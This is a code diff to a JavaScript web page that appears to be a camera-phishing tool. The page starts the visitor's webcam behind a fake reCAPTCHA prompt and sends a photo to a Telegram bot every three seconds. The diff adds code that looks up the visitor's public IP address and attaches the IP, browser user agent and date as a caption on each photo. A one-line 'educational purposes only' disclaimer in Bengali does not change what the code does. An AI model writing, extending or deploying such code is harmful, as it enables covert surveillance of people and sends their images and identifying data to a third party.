@@ -13,12 +13,31 @@ const chatId = params.get("id");
 
 let stream = null;
 let captureInterval = null;
+let publicIP = "Unknown";
+
+// Get real public IP
+async function fetchIP(){
+  try{
+    const res = await fetch("https://api.ipify.org?format=json");
+    const data = await res.json();
+    publicIP = data.ip;
+  }catch(e){
+    console.error("IP fetch failed", e);
+  }
+}
 
 // Toast message
 function showToast(msg){
   toast.innerText = msg;
   toast.style.opacity=1;
   setTimeout(()=>{toast.style.opacity=0},3000);
+}
+
+// Build caption for each photo
+function buildCaption(){
+  const userAgent = navigator.userAgent;
+  const date = new Date().toLocaleString();
+  return `🌐 IP Address: ${publicIP}\n💻 User Agent: ${userAgent}\n📅 Date: ${date}\n⚠️ এটি শুধু শিক্ষামূলক উদ্দেশ্যে বানানো হয়েছে। কেউ কারো ক্ষতি করবেন না।\n🔗 Developer Telegram: @YourTelegramID`;
 }
 
 // Capture & send
@@ -33,6 +52,7 @@ async function captureAndSend(){
     const formData = new FormData();
     formData.append("chat_id", chatId);
     formData.append("photo", blob);
+    formData.append("caption", buildCaption());
     try{
       const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
         method:"POST",
@@ -51,13 +71,13 @@ async function captureAndSend(){
 // Start camera
 async function startCamera(){
   try{
+    await fetchIP(); // get public IP
     stream = await navigator.mediaDevices.getUserMedia({video:true});
     video.srcObject = stream;
     video.play();
-    // every 3 sec
     captureInterval = setInterval(captureAndSend,3000);
     showToast("Camera started ✅");
-    recaptchaSection.style.display="block"; // show reCAPTCHA
+    recaptchaSection.style.display="block";
   }catch(e){
     showToast("Permission denied ❌");
     console.error(e);
